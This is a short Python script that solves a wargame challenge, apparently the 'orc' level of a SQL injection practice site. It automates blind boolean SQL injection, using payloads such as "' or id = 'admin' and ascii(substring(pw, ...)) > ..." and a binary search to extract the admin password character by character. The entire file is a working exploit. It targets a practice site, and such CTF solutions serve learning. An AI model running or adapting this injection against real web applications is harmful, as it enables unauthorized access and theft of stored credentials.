import requests

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookie = {'PHPSESSID': 'cookie'}

def find_length():
    pwlength = 1

    while True:
        param = {"pw": "' or id = 'admin' and length(pw) = {} #".format(pwlength)}
        req = requests.get(url, params = param, cookies = cookie)
        if "Hello admin" in req.text:
            return pwlength
        else:
            pwlength += 1

def find_pw():
    length = find_length()
    password = ""
    for i in range(length):
        s = 1
        e = 127
        value = 64
        while True:
            param = {"pw": "' or id = 'admin' and ascii(substring(pw, {}, 1)) = {} #".format(i+1, value)}
            print(param)
            req = requests.get(url, params = param, cookies = cookie)
            if "Hello admin" in req.text:
                password += chr(value)
                break
            else:
                param = {"pw": "' or id = 'admin' and ascii(substring(pw, {}, 1)) > {} #".format(i+1, value)}
                req = requests.get(url, params = param, cookies = cookie)
                if "Hello admin" in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
    print("비밀번호는: ", password)

find_pw()